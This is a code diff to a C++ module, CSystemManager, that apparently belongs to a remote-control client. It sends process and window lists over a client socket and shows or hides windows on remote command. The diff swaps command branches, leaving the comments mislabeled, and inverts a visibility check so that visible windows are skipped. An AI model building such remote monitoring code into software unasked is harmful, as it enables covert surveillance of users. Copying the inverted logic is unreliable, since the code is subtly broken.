@@ -17,16 +17,19 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
+
+int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount);
+
 CSystemManager::CSystemManager(CClientSocket *pClient, BYTE bHow) : CManager(pClient)
 {
 	m_caseSystemIs = bHow;
-	if (m_caseSystemIs == COMMAND_SYSTEM)     //如果是获取进程
-	{
-		SendProcessList();
-	}
-	else if (m_caseSystemIs == COMMAND_WSLIST)   //如果是获取窗口
+	if (m_caseSystemIs == COMMAND_WSLIST)     //如果是获取进程
 	{
 		SendWindowsList();
+	}
+	else if (m_caseSystemIs == COMMAND_SYSTEM)   //如果是获取窗口
+	{
+		SendProcessList();
 	}
 }
 
@@ -342,10 +345,16 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	char	strTitle[1024];
 	memset(strTitle, 0, sizeof(strTitle));
 	//获取传进来的窗口句柄的标题
-	GetWindowText(hwnd, strTitle, sizeof(strTitle));
-	//判断窗口是否可见，标题是否为空
-	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
+	if (IsWindowVisible(hwnd))
 		return true;
+	//GetWindowText(hwnd, strTitle, sizeof(strTitle));
+	GetWindowTextSafe(hwnd, strTitle, sizeof(strTitle));
+	//判断窗口是否可见，标题是否为空
+	if (lstrlen(strTitle) == 0)
+	{
+		OutputDebugString("lstrlen");
+		return true;
+	}
 	
 	//如果指针为空的话申请一个堆
 	//（该函数时循环的所以第二次进来就不是空的，用动态的LocalReAlloc改变堆大小实现数据都在一个堆上）
@@ -401,4 +410,52 @@ void CSystemManager::ShowTheWindow(LPBYTE buf)
 	memcpy((void*)&hwnd, buf, sizeof(DWORD));				//得到窗口句柄
 	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));		//得到窗口处理参数
 	ShowWindow((HWND__ *)hwnd, dHow);
+}
+
+
+int GetWindowTextSafe(HWND hWnd, LPTSTR lpString, int nMaxCount)
+{
+	if (NULL == hWnd || FALSE == IsWindow(hWnd) || NULL == lpString || 0 == nMaxCount)
+	{
+		return GetWindowText(hWnd, lpString, nMaxCount);
+	}
+	DWORD dwHwndProcessID = 0;
+	DWORD dwHwndThreadID = 0;
+	dwHwndThreadID = GetWindowThreadProcessId(hWnd, &dwHwndProcessID);		//获取窗口所属的进程和线程ID
+
+	if (dwHwndProcessID != GetCurrentProcessId())		//窗口进程不是当前调用进程时，返回原本调用
+	{
+		return GetWindowText(hWnd, lpString, nMaxCount);
+	}
+
+	//窗口进程是当前进程时：
+	if (dwHwndThreadID == GetCurrentThreadId())			//窗口线程就是当前调用线程，返回原本调用
+	{
+		return GetWindowText(hWnd, lpString, nMaxCount);
+	}
+
+#ifndef _UNICODE
+	WCHAR *lpStringUnicode = new WCHAR[nMaxCount];
+	InternalGetWindowText(hWnd, lpStringUnicode, nMaxCount);
+	int size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, NULL, 0, NULL, NULL);
+	if (size <= nMaxCount)
+	{
+		size = WideCharToMultiByte(CP_ACP, 0, lpStringUnicode, -1, lpString, size, NULL, NULL);
+		if (NULL != lpStringUnicode)
+		{
+			delete[]lpStringUnicode;
+			lpStringUnicode = NULL;
+		}
+		return size;
+	}
+	if (NULL != lpStringUnicode)
+	{
+		delete[]lpStringUnicode;
+		lpStringUnicode = NULL;
+	}
+	return 0;
+
+#else
+	return InternalGetWindowText(hWnd, lpString, nMaxCount);
+#endif
 }
